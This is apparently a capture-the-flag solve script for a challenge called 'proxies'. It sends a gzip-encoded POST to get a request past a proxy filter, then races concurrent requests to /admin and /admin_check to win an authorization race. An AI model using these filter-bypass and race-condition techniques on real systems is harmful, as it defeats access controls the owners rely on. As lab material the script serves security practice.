import subprocess
base_url = "https://inst-a93b1ac297c3b8d3-proxies.chal.crewc.tf"

def part_1():
    cmd = [
        "curl",
        "-s",
        "-X",
        "POST",
        f"{base_url}/a",
        "-H",
        "Content-Encoding: gzip",
        "--data-binary",
        "@-"
    ]
    gzip_process = subprocess.Popen(
        ["gzip", "-c"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    curl_process = subprocess.Popen(
        cmd,
        stdin=gzip_process.stdout,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    gzip_process.stdin.write(b"GIVE ME FLAG!")
    gzip_process.stdin.close()
    curl_process_stdout, curl_process_stderr = curl_process.communicate()
    if curl_process.returncode != 0:
        print(f"Error in curl command: {curl_process_stderr.decode()}")
    else:
        print(curl_process_stdout.decode())


# part_1()

# For part 2, it is a race condition challenge on /admin and /admin_check you have to try this multiple times to get the result

import threading

def send_request(url, barrier=None):
    try:
        # Wait for all threads before sending
        barrier.wait()
        response = subprocess.check_output(["curl", "-s", url]).decode()
        print(f"[{threading.current_thread().name}] {response}")
    except Exception as e:
        print(f"[{threading.current_thread().name}] Error: {e}")

def part_2():
    num_requests = 5
    barrier = threading.Barrier(num_requests*2)

    threads = []
    url1 = f"{base_url}/admin"
    url2 = f"{base_url}/admin_check"
    for i in range(num_requests):
        t = threading.Thread(
            target=send_request,
            args=(url1, barrier),
            name=f"Thread-{i+1}"
        )
        threads.append(t)
        t.start()
    
    for i in range(num_requests):
        t = threading.Thread(
            target=send_request,
            args=(url2, barrier),
            name=f"Thread-{i+1+num_requests}"
        )
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()

if __name__ == "__main__":
    part_1()
    part_2()
